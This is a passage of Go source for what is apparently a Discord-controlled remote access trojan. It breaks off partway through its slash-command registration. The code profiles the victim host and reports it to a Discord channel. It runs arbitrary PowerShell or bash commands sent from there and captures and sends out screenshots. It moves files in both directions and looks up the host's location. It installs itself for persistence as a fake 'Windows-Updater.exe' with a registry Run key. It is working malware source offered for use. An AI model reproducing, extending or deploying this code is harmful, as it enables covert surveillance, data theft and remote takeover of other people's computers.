package main

import (
	"encoding/json"
	"fmt"
	"image/png"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"os/user"
	"regexp"
	"runtime"
	"strings"
	"syscall"
	"time"

	"github.com/bwmarrin/discordgo"
	"github.com/kbinani/screenshot"
	"github.com/shirou/gopsutil/cpu"
	"golang.org/x/sys/windows"
)

// Global variable for channel ID
var myChannelId string

type LocationResponse struct {
	IP       string `json:"YourFuckingIPAddress"`
	Country  string `json:"YourFuckingCountry"`
	City     string `json:"YourFuckingCity"`
	Location string `json:"YourFuckingLocation"`
}

// sendAndPinEmbedMessage creates and sends an embed message to the specified channel and pins it.
func sendAndPinEmbedMessage(dg *discordgo.Session, channelID, sessionId, hostname string) error {
	// Get current user and other information
	currentUser, _ := user.Current()
	cwd, _ := os.Getwd()
	conn, _ := net.Dial("udp", "8.8.8.8:80")
	defer conn.Close()
	localAddr := conn.LocalAddr().(*net.UDPAddr)
	now := time.Now().Format("02/01/2006 15:04:05")

	// Create the embed message
	embed := &discordgo.MessageEmbed{
		Title:       fmt.Sprintf("Session *%s* opened! 🥳", sessionId),
		Description: fmt.Sprintf("**CWD**: %s", cwd),
		Color:       0x00FF00, // You can choose the color you want
		Fields: []*discordgo.MessageEmbedField{
			{Name: "**Time**", Value: now, Inline: true},
			{Name: "**IP**", Value: localAddr.IP.String(), Inline: true},
			{Name: "**Bits**", Value: getBits(), Inline: true},
			{Name: "**Hostname**", Value: hostname, Inline: true},
			{Name: "**OS**", Value: runtime.GOOS, Inline: true},
			{Name: "**Username**", Value: currentUser.Username, Inline: true},
			{Name: "**CPU**", Value: getCPU(), Inline: true},
			{Name: "**Is Admin**", Value: isAdmin(), Inline: true},
			{Name: "**Is VM**", Value: isVM(), Inline: true},
		},
	}

	buttons := discordgo.ActionsRow{
		Components: []discordgo.MessageComponent{
			discordgo.Button{
				Label:    "Processes",
				Style:    discordgo.SecondaryButton,
				CustomID: "process",
				Emoji: &discordgo.ComponentEmoji{
					Name: "📊",
				},
			},
			discordgo.Button{
				Label:    "Screenshot",
				Style:    discordgo.SecondaryButton,
				CustomID: "screenshot",
				Emoji: &discordgo.ComponentEmoji{
					Name: "📸",
				},
			},
			discordgo.Button{
				Label:    "Terminate",
				Style:    discordgo.SecondaryButton,
				CustomID: "terminate",
				Emoji: &discordgo.ComponentEmoji{
					Name: "❌",
				},
			},
			discordgo.Button{
				Label:    "Help",
				Style:    discordgo.SecondaryButton,
				CustomID: "help",
				Emoji: &discordgo.ComponentEmoji{
					Name: "❓",
				},
			},
			discordgo.Button{
				Label:    "Persistence",
				Style:    discordgo.SecondaryButton,
				CustomID: "persistence",
				Emoji: &discordgo.ComponentEmoji{
					Name: "🔁",
				},
			},
		},
	}

	buttons2 := discordgo.ActionsRow{
		Components: []discordgo.MessageComponent{
			discordgo.Button{
				Label:    "Run",
				Style:    discordgo.SecondaryButton,
				CustomID: "run",
				Emoji: &discordgo.ComponentEmoji{
					Name: "🌐",
				},
			},
		},
	}

	// Send the embed message with buttons
	m, err := dg.ChannelMessageSendComplex(channelID, &discordgo.MessageSend{
		Embed:      embed,
		Components: []discordgo.MessageComponent{buttons, buttons2},
	})
	if err != nil {
		return fmt.Errorf("error sending complex message: %w", err)
	}

	// Pin the message
	err = dg.ChannelMessagePin(channelID, m.ID)
	if err != nil {
		return fmt.Errorf("error pinning message: %w", err)
	}

	return nil
}

func interactionHandler(s *discordgo.Session, i *discordgo.InteractionCreate) {
	switch i.Type {
	case discordgo.InteractionMessageComponent:
		handleButtonInteraction(s, i) // Separate function to handle button clicks

	case discordgo.InteractionApplicationCommand:
		slashCommandHandler(s, i) // Handle slash commands

	default:
		fmt.Println("Unhandled interaction type:", i.Type)
	}
}

// Example of handling button interactions
func handleButtonInteraction(s *discordgo.Session, i *discordgo.InteractionCreate) {
	switch i.MessageComponentData().CustomID {
	case "terminate":
		fmt.Println("Terminating session...")
		go handleShutdown(s, i)
	case "process":
		fmt.Println("Listing processes...")
		go handleListProcesses(s, i)
	case "screenshot":
		fmt.Println("Taking screenshot...")
		go handleScreenshot(s, i)
	case "help":
		fmt.Println("Displaying help...")
		go helpCommand(s, i.ChannelID)
	}
}

func getBits() string {
	if runtime.GOARCH == "amd64" {
		return "64-bit"
	}
	return "32-bit"
}

func getCPU() string {
	cpuInfo, err := cpu.Info()
	if err != nil {
		return "None" // Return "None" if an error occurs
	}

	// Assuming we want to return the first CPU's model name
	if len(cpuInfo) > 0 {
		return cpuInfo[0].ModelName // Return the model name of the first CPU
	}
	return "None"
}

func isAdmin() string {
	if runtime.GOOS == "windows" {
		// Windows specific check for admin rights
		var sid *windows.SID
		if err := windows.ConvertStringSidToSid(windows.StringToUTF16Ptr("S-1-5-32-544"), &sid); err != nil {
			return "No" // Unable to get SID, assume not admin
		}

		isAdmin := false
		var token windows.Token
		if err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_QUERY, &token); err == nil {
			defer token.Close()

			// Check if the user has admin privileges
			if isAdmin, err = token.IsMember(sid); err != nil {
				return "No" // Error checking membership
			}
		}

		if isAdmin {
			return "Yes" // User is an admin
		}
		return "No" // User is not an admin
	} else {
		// Linux and macOS specific check for admin rights
		if os.Geteuid() == 0 {
			return "Yes" // User is root
		}
		return "No" // User is not root
	}
}

func isVM() string {
	rules := []string{"Virtualbox", "vmbox", "vmware"}
	cmd := exec.Command("cmd", "/C", "SYSTEMINFO") // Using cmd on Windows

	out, err := cmd.Output()
	if err != nil {
		return "No" // Error executing command, assume not a VM
	}

	// Convert output to string
	output := string(out)

	for _, rule := range rules {
		// Using regular expression to check for virtualization keywords
		match, _ := regexp.MatchString("(?i)"+regexp.QuoteMeta(rule), output)
		if match {
			return "Yes" // Found a match, it is a VM
		}
	}
	return "No" // No matches found, it is not a VM
}

// helpCommand sends a list of available commands and their descriptions
// helpCommand sends a list of available commands and their descriptions
func helpCommand(s *discordgo.Session, channelID string) {
	commands := []struct {
		Command     string
		Description string
	}{
		// Slash commands
		{"/run <command>", "Runs a system command."},
		{"/screenshot", "Takes a screenshot of all displays."},
		{"/upload <file>", "Uploads a specified file from your system."},
		{"/download <path>", "Downloads the attached file to the specified path."},
		{"/shutdown", "Shuts down the bot."},
		{"/help", "Displays this help menu."},
		// Emoji-based commands
		{"🏃‍♂️ <command>", "Runs a system command."},
		{"📸", "Takes a screenshot of all displays."},
		{"👇 <file>", "Uploads a specified file from your system."},
		{"☝️ <path>", "Downloads the attached file to the specified path."},
		{"💀", "Shuts down the bot."},
		{"!help", "Displays this help menu."},
	}

	var helpMessage strings.Builder
	helpMessage.WriteString("```bash\n")
	helpMessage.WriteString("Available Commands:\n\n")
	for _, cmd := range commands {
		helpMessage.WriteString(fmt.Sprintf("%s - %s\n", cmd.Command, cmd.Description))
	}
	helpMessage.WriteString("```")

	// Send the help message to the specified channel
	s.ChannelMessageSend(channelID, helpMessage.String())
}

// getTmpDir returns the OS-specific temp directory
func getTmpDir() string {
	if runtime.GOOS == "windows" {
		return "C:\\Windows\\Tasks\\"
	}
	return "/tmp/"
}

func handleUploadCommand(s *discordgo.Session, i *discordgo.InteractionCreate) {
	// Extract the URL and path options
	url := i.ApplicationCommandData().Options[0].StringValue()
	path := i.ApplicationCommandData().Options[1].StringValue()

	// Upload the file from the URL
	if err := uploadFileFromURL(s, i, url, path); err != nil {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "Error uploading file from URL: " + err.Error(),
			},
		})
		return
	}
}

func uploadFileFromURL(s *discordgo.Session, i *discordgo.InteractionCreate, url, path string) error {
	// Create the file at the specified path
	out, err := os.Create(path)
	if err != nil {
		return fmt.Errorf("error creating file: %w", err)
	}
	defer out.Close()

	// Download the file from the provided URL
	resp, err := http.Get(url)
	if err != nil {
		return fmt.Errorf("error downloading file: %w", err)
	}
	defer resp.Body.Close()

	// Check if the response status is OK
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("error: received status code %d", resp.StatusCode)
	}

	// Write the response body to the file
	if _, err := io.Copy(out, resp.Body); err != nil {
		return fmt.Errorf("error writing to file: %w", err)
	}

	// Send a confirmation message back to Discord
	s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{
			Content: "Uploaded file from URL to " + path,
		},
	})
	return nil
}

// sendLongMessage handles messages that are too long to send in a single Discord message
func sendLongMessage(s *discordgo.Session, channelID string, out []byte, ref *discordgo.MessageReference) {
	if len(out) > 2000-13 { // Check if the message is too long
		tempFile, err := os.CreateTemp(getTmpDir(), "*.txt")
		if err != nil {
			fmt.Println("Error creating temp file:", err)
			return
		}
		defer tempFile.Close()

		tempFile.Write(out)
		fileName := tempFile.Name()

		f, err := os.Open(fileName)
		if err != nil {
			fmt.Println("Error opening temp file:", err)
			return
		}
		defer f.Close()

		fileStruct := &discordgo.File{Name: fileName, Reader: f}
		s.ChannelMessageSendComplex(channelID, &discordgo.MessageSend{
			Files:     []*discordgo.File{fileStruct},
			Reference: ref,
		})
	} else {
		resp := fmt.Sprintf("```bash\n%s\n```", string(out))
		s.ChannelMessageSendReply(channelID, resp, ref)
	}
}

// runCommand runs a system command based on the OS
// runCommand executes a shell command and sends the output to Discord, handling both message and slash commands.
func runCommand(s *discordgo.Session, message interface{}, command string) {
	var out []byte
	var err error

	// Determine if running on Windows or Unix-like system
	if runtime.GOOS == "windows" {
		cmd := exec.Command("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", command)
		out, err = cmd.CombinedOutput()
	} else {
		cmd := exec.Command("/bin/bash", "-c", command)
		out, err = cmd.CombinedOutput()
	}

	// Append error output if there is an error
	if err != nil {
		out = append(out, []byte("\n"+err.Error())...)
	}

	// Determine the type of message to respond to
	switch m := message.(type) {
	case *discordgo.MessageCreate:
		// For message commands (e.g., emoji commands)
		sendLongMessage(s, m.ChannelID, out, m.Reference())
	case *discordgo.InteractionCreate:
		// For slash commands
		if len(out) > 2000-13 {
			tempFile, err := os.CreateTemp("", "*.txt")
			if err != nil {
				fmt.Println("Error creating temp file:", err)
				return
			}
			defer os.Remove(tempFile.Name()) // Clean up the temp file afterwards

			// Write output to the temporary file
			if _, err := tempFile.Write(out); err != nil {
				fmt.Println("Error writing to temp file:", err)
				return
			}
			tempFile.Close() // Close the file to flush the buffer

			// Open the temporary file for reading
			f, err := os.Open(tempFile.Name())
			if err != nil {
				fmt.Println("Error opening temp file:", err)
				return
			}
			defer f.Close()

			// Prepare the file for Discord message
			fileStruct := &discordgo.File{Name: tempFile.Name(), Reader: f}

			// Send the message with the file attachment
			s.InteractionRespond(m.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "Command output is too long, here is the output as a file:",
					Files:   []*discordgo.File{fileStruct},
				},
			})
		} else {
			// Respond to the interaction with the command output
			s.InteractionRespond(m.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: fmt.Sprintf("Command output:\n```bash\n%s\n```", string(out)),
				},
			})
		}
	default:
		// Unsupported message type
		fmt.Println("Unsupported message type")
	}
}

// Function to list all running processes on the system
func handleListProcesses(s *discordgo.Session, i *discordgo.InteractionCreate) {
	// Function to list all running processes on the system
	listProcesses := func() (string, error) {
		var cmd *exec.Cmd

		// Check the OS type and set the appropriate command to list processes
		if runtime.GOOS == "windows" {
			// Use tasklist for Windows
			cmd = exec.Command("tasklist")
		} else {
			// Use ps on Unix-based systems (Linux, macOS, etc.)
			cmd = exec.Command("ps", "aux")
		}

		// Run the command and capture the output
		output, err := cmd.CombinedOutput()
		if err != nil {
			return "", err
		}

		// Return the output wrapped in a bash-styled code block
		return fmt.Sprintf("```bash\n%s\n```", string(output)), nil
	}

	// Call the listProcesses function to get the process list
	processList, err := listProcesses()
	if err != nil {
		processList = fmt.Sprintf("Error listing processes: %v", err)
	}

	// Convert the process list to a byte array for handling long messages
	out := []byte(processList)

	// Check if the interaction has an associated message reference
	var messageRef *discordgo.MessageReference
	if i.Interaction.Message != nil {
		messageRef = i.Interaction.Message.Reference()
	}
	// Send the process list, handling long outputs
	sendLongMessage(s, i.ChannelID, out, messageRef)
}

// Function to list directory contents with bash styling
func handleListDirectory(s *discordgo.Session, i *discordgo.InteractionCreate) {
	// Retrieve the directory path from the command options
	var path string
	if len(i.ApplicationCommandData().Options) > 0 {
		path = i.ApplicationCommandData().Options[0].StringValue()
	} else {
		path = "." // Default to current directory
	}

	// Attempt to list the directory contents
	files, err := os.ReadDir(path)
	if err != nil {
		// Respond with an error message if the directory listing fails
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: fmt.Sprintf("Error listing directory: %v", err),
			},
		})
		return
	}

	// Build the directory contents string
	var contents []string
	for _, file := range files {
		contents = append(contents, file.Name())
	}

	// Join contents and format them in bash-style for Discord
	dirList := strings.Join(contents, "\n")
	formattedContents := fmt.Sprintf("```bash\n%s\n```", dirList)

	// Respond with the directory contents
	s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{
			Content: fmt.Sprintf("Contents of `%s`:\n%s", path, formattedContents),
		},
	})
}

// Function to change the wallpaper based on the operating system
func handleWallpaperChange(s *discordgo.Session, i *discordgo.InteractionCreate) {
	// Get the image URL from the command options
	if len(i.ApplicationCommandData().Options) == 0 {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "Error: No URL provided.",
			},
		})
		return
	}
	url := i.ApplicationCommandData().Options[0].StringValue()

	// Download and change wallpaper using the provided URL
	err := func(imageURL string) error {
		// Download the image
		response, err := http.Get(imageURL)
		if err != nil {
			return fmt.Errorf("error downloading image: %v", err)
		}
		defer response.Body.Close()

		// Check if the response is successful
		if response.StatusCode != http.StatusOK {
			return fmt.Errorf("failed to download image: status code %d", response.StatusCode)
		}

		// Create a temporary file to save the downloaded image
		tempFile, err := os.CreateTemp("", "wallpaper.*.jpg")
		if err != nil {
			return fmt.Errorf("error creating temp file: %v", err)
		}
		defer os.Remove(tempFile.Name()) // Clean up temp file

		// Write the image data to the temp file
		_, err = io.Copy(tempFile, response.Body)
		if err != nil {
			return fmt.Errorf("error saving image to temp file: %v", err)
		}

		// Set the wallpaper based on the operating system
		switch runtime.GOOS {
		case "windows":
			err = func(imagePath string) error {
				// Use Windows API to change wallpaper
				cmd := exec.Command("cmd", "/C", "reg", "add", "HKEY_CURRENT_USER\\Control Panel\\Desktop", "/v", "WallPaper", "/t", "REG_SZ", "/d", imagePath, "/f")
				if err := cmd.Run(); err != nil {
					return fmt.Errorf("error setting wallpaper: %v", err)
				}

				// Notify Windows to update the wallpaper
				cmd = exec.Command("RUNDLL32.EXE", "user32.dll,UpdatePerUserSystemParameters")
				return cmd.Run()
			}(tempFile.Name())

		default: // Assume Unix-based systems
			err = func(imagePath string) error {
				// Use `feh` or other wallpaper managers
				cmd := exec.Command("feh", "--bg-scale", imagePath)
				return cmd.Run()
			}(tempFile.Name())
		}

		return err
	}(url)

	// Respond with appropriate message based on the outcome
	if err != nil {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: fmt.Sprintf("Error changing wallpaper: %v", err),
			},
		})
	} else {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "Wallpaper changed successfully!",
			},
		})
	}
}

// Function to enable persistence
func handlePersistence(s *discordgo.Session, i *discordgo.InteractionCreate) {
	// Define the backdoor location (in AppData folder)
	appData := os.Getenv("APPDATA")
	if appData == "" {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "Error: APPDATA environment variable not found.",
			},
		})
		return
	}

	backdoorLocation := appData + "\\Windows-Updater.exe"

	// Check if the backdoor file already exists
	if _, err := os.Stat(backdoorLocation); !os.IsNotExist(err) {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "Persistence already enabled.",
			},
		})
		return
	}

	// Copy the current executable to the backdoor location
	currentExecutable, err := os.Executable()
	if err != nil {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: fmt.Sprintf("Error getting current executable path: %v", err),
			},
		})
		return
	}

	err = copyFile(currentExecutable, backdoorLocation)
	if err != nil {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: fmt.Sprintf("Error copying file to AppData: %v", err),
			},
		})
		return
	}

	// Add the backdoor to the Windows startup via registry
	cmd := exec.Command("reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "update", "/t", "REG_SZ", "/d", backdoorLocation, "/f")
	err = cmd.Run()
	if err != nil {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: fmt.Sprintf("Error adding to registry: %v", err),
			},
		})
		return
	}

	// If everything is successful
	s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{
			Content: "Persistence enabled successfully.",
		},
	})
}

// Helper function to copy files
func copyFile(src, dst string) error {
	sourceFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	destinationFile, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer destinationFile.Close()

	_, err = io.Copy(destinationFile, sourceFile)
	return err
}

// handleScreenshot takes and sends a screenshot of all displays
func handleScreenshot(s *discordgo.Session, message interface{}) {
	n := screenshot.NumActiveDisplays()
	if n == 0 {
		if interaction, ok := message.(*discordgo.InteractionCreate); ok {
			fmt.Println("No active displays found.")
			s.InteractionRespond(interaction.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "No active displays found.",
				},
			})
		} else if message, ok := message.(*discordgo.MessageCreate); ok {
			fmt.Println("No active displays found.")
			s.ChannelMessageSend(message.ChannelID, "No active displays found.")
		}
		return
	}

	var filePaths []string // Collect file paths for sending later
	for idx := 0; idx < n; idx++ {
		bounds := screenshot.GetDisplayBounds(idx)
		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			fmt.Println("Error capturing screenshot:", err)
			continue
		}

		fileName := fmt.Sprintf("%s%d_%dx%d.png", getTmpDir(), idx, bounds.Dx(), bounds.Dy())
		file, err := os.Create(fileName)
		if err != nil {
			fmt.Println("Error creating screenshot file:", err)
			continue
		}
		defer file.Close()

		// Encode the image to the file
		if err := png.Encode(file, img); err != nil {
			fmt.Println("Error encoding image to file:", err)
			continue
		}

		// Store file path for later sending
		filePaths = append(filePaths, fileName)
	}

	// Send all captured screenshots
	for _, fileName := range filePaths {
		f, err := os.Open(fileName)
		if err != nil {
			fmt.Println("Error opening screenshot file:", err)
			continue
		}
		defer f.Close() // Ensure file is closed after sending

		fileStruct := &discordgo.File{Name: fileName, Reader: f}

		if interaction, ok := message.(*discordgo.InteractionCreate); ok {
			fmt.Printf("Sending screenshot for interaction: %s\n", fileName)
			_, err = s.ChannelMessageSendComplex(interaction.ChannelID, &discordgo.MessageSend{
				Files: []*discordgo.File{fileStruct},
			})
			if err != nil {
				fmt.Println("Error sending screenshot:", err)
			}
		} else if msg, ok := message.(*discordgo.MessageCreate); ok {
			fmt.Printf("Sending screenshot for message: %s\n", fileName)
			_, err = s.ChannelMessageSendComplex(msg.ChannelID, &discordgo.MessageSend{
				Files:     []*discordgo.File{fileStruct},
				Reference: msg.Reference(),
			})
			if err != nil {
				fmt.Println("Error sending screenshot:", err)
			}
		}
	}

	// Final response for slash commands
	if interaction, ok := message.(*discordgo.InteractionCreate); ok {
		fmt.Println("Responding to interaction after sending screenshots.")
		s.InteractionRespond(interaction.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "Screenshots sent!",
			},
		})
	}

}

// handleFileDownload uploads a file from the system to Discord if it's under 8MB
// handleFileDownload uploads a file from the system to Discord if it's under 8MB
func handleFileDownload(s *discordgo.Session, message interface{}) {
	var fileName string
	var interaction *discordgo.InteractionCreate
	var msg *discordgo.MessageCreate

	// Determine the type of message (either interaction or message)
	switch m := message.(type) {
	case *discordgo.MessageCreate:
		// It's a message command
		msg = m
		fileName = m.Content[5:] // Assuming command is "/download "
	case *discordgo.InteractionCreate:
		// It's a slash command
		interaction = m
		fileName = m.ApplicationCommandData().Options[0].StringValue()
	default:
		// Unsupported message type
		return
	}

	// Open the file
	f, err := os.Open(fileName)
	if err != nil {
		if interaction != nil {
			// Respond to the interaction
			s.InteractionRespond(interaction.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "Error opening file: " + err.Error(),
				},
			})
		} else {
			// Respond to the message
			s.ChannelMessageSendReply(msg.ChannelID, "Error opening file: "+err.Error(), msg.Reference())
		}
		return
	}
	defer f.Close()

	fi, err := f.Stat()
	if err != nil {
		if interaction != nil {
			s.InteractionRespond(interaction.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "Error getting file info: " + err.Error(),
				},
			})
		} else {
			s.ChannelMessageSendReply(msg.ChannelID, "Error getting file info: "+err.Error(), msg.Reference())
		}
		return
	}

	if fi.Size() < 8388608 { // Less than 8MB
		fileStruct := &discordgo.File{Name: fileName, Reader: f}
		if interaction != nil {
			// Send file with interaction response
			s.InteractionRespond(interaction.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "Uploading file...",
					Files:   []*discordgo.File{fileStruct},
				},
			})
		} else {
			// Send file with message response
			s.ChannelMessageSendComplex(msg.ChannelID, &discordgo.MessageSend{
				Files:     []*discordgo.File{fileStruct},
				Reference: msg.Reference(),
			})
		}
	} else {
		if interaction != nil {
			// Respond to interaction if file is too large
			s.InteractionRespond(interaction.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "File is larger than 8MB 😔",
				},
			})
		} else {
			// Respond to message if file is too large
			s.ChannelMessageSendReply(msg.ChannelID, "File is larger than 8MB 😔", msg.Reference())
		}
	}
}

// handleFileUpload downloads the attached file from Discord to the system
func handleFileUpload(s *discordgo.Session, m *discordgo.MessageCreate) {
	path := m.Content[7:]
	if len(m.Attachments) > 0 {
		out, err := os.Create(path)
		if err != nil {
			s.ChannelMessageSendReply(m.ChannelID, "Error creating file: "+err.Error(), m.Reference())
			return
		}
		defer out.Close()

		resp, err := http.Get(m.Attachments[0].URL)
		if err != nil {
			s.ChannelMessageSendReply(m.ChannelID, "Error downloading file: "+err.Error(), m.Reference())
			return
		}
		defer resp.Body.Close()

		io.Copy(out, resp.Body)
		s.ChannelMessageSendReply(m.ChannelID, "Uploaded file to "+path, m.Reference())
	}
}

// Function to fetch location data
// handleLocation fetches the location data and responds to the Discord interaction.
func handleLocation(s *discordgo.Session, i *discordgo.InteractionCreate) {
	// Fetch location data from the API
	response, err := http.Get("https://json.ipv4.myip.wtf")
	if err != nil {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "Error fetching location data.",
			},
		})
		return
	}
	defer response.Body.Close()

	if response.StatusCode != http.StatusOK {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "Failed to fetch location data.",
			},
		})
		return
	}

	var locationData LocationResponse
	if err := json.NewDecoder(response.Body).Decode(&locationData); err != nil {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "Error decoding location data.",
			},
		})
		return
	}

	// Prepare the response message
	responseMessage := fmt.Sprintf("Your IP: %s\nCountry: %s\nCity: %s\nLocation: %s",
		locationData.IP, locationData.Country, locationData.City, locationData.Location)

	// Respond to the interaction
	s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{
			Content: responseMessage,
		},
	})
}

// Function to change the directory
// handleChangeDirectory handles the "cd" command, retrieving the path, changing the directory, and sending the response
func handleChangeDirectory(s *discordgo.Session, i *discordgo.InteractionCreate) {
	// Check if the path argument is provided
	if len(i.ApplicationCommandData().Options) == 0 {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "Error: No path provided.",
			},
		})
		return
	}

	// Retrieve the path argument from the command
	path := i.ApplicationCommandData().Options[0].StringValue()

	// Try to change the directory
	err := os.Chdir(path)
	if err != nil {
		// Respond with an error if the directory change fails
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: fmt.Sprintf("Error changing directory: %v", err),
			},
		})
		return
	}

	// Respond with success if the directory change succeeds
	s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{
			Content: fmt.Sprintf("Successfully changed directory to: %s", path),
		},
	})
}

// Function to handle the bot shutdown
func handleShutdown(s *discordgo.Session, i *discordgo.InteractionCreate) {
	// Respond to the interaction
	if err := s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{
			Content: "Shutting down the bot... Goodbye! 👋",
		},
	}); err != nil {
		fmt.Printf("Error responding to interaction: %v\n", err)
	}

	// Close the Discord session and exit
	s.Close()
	os.Exit(0)
}

// handler manages the incoming Discord commands
func handler(s *discordgo.Session, m *discordgo.MessageCreate) {
	// Ignore messages in other channels and own messages
	if m.ChannelID != myChannelId || m.Author.ID == s.State.User.ID {
		return
	}

	s.MessageReactionAdd(m.ChannelID, m.ID, "🕐") // Processing...

	switch {
	case strings.HasPrefix(m.Content, "🏃‍♂️"):
		go runCommand(s, m, m.Content[14:])
	case m.Content == "📸":
		go handleScreenshot(s, m)
	case strings.HasPrefix(m.Content, "👇"):
		go handleFileDownload(s, m)
	case strings.HasPrefix(m.Content, "☝️"):
		go handleFileUpload(s, m)
	case m.Content == "💀":
		s.Close()
		os.Exit(0)
	case strings.HasPrefix(m.Content, "!help"):
		go helpCommand(s, m.ChannelID)
	}

	s.MessageReactionRemove(m.ChannelID, m.ID, "🕐", "@me")
	s.MessageReactionAdd(m.ChannelID, m.ID, "✅")
}

// slashCommandHandler handles the new slash commands
func slashCommandHandler(s *discordgo.Session, i *discordgo.InteractionCreate) {
	switch i.ApplicationCommandData().Name {
	case "cmd":
		command := i.ApplicationCommandData().Options[0].StringValue()
		runCommand(s, i, command)
	case "help":
		go helpCommand(s, i.ChannelID)
	case "screenshot":
		go handleScreenshot(s, i)
	case "download":
		go handleFileDownload(s, i.Interaction)
	case "location":
		go handleLocation(s, i)
	case "cd":
		go handleChangeDirectory(s, i)
	case "upload":
		go handleUploadCommand(s, i)
	case "persistent":
		go handlePersistence(s, i)
	case "ls":
		go handleListDirectory(s, i)
	case "process":
		go handleListProcesses(s, i)
	case "wallpaper":
		go handleWallpaperChange(s, i)
	case "shutdown":
		go handleShutdown(s, i)
	}
}

// registerSlashCommands registers the new /cmd slash command
// registerCommand is a helper function to create a command and handle errors.
func registerCommand(s *discordgo.Session, command *discordgo.ApplicationCommand) {
	_, err := s.ApplicationCommandCreate(s.State.User.ID, myChannelId, command)
	if err != nil {
		fmt.Printf("Error creating command '%s': %v\n", command.Name, err)
	}
}

// registerSlashCommands registers the new slash commands
func registerSlashCommands(s *discordgo.Session) {
	commands := []*discordgo.ApplicationCommand{
		{
			Name:        "cmd",
			Description: "Run a system command",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "command",
					Description: "The system command to run",
					Required:    true,
				},
			},
		},
		{
			Name:        "help",
			Description: "Displays the help menu",
		},
		{
			Name:        "download",
			Description: "Download a file from the server",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "file",
					Description: "The file path to download",
					Required:    true,
				},
			},
		},
		{
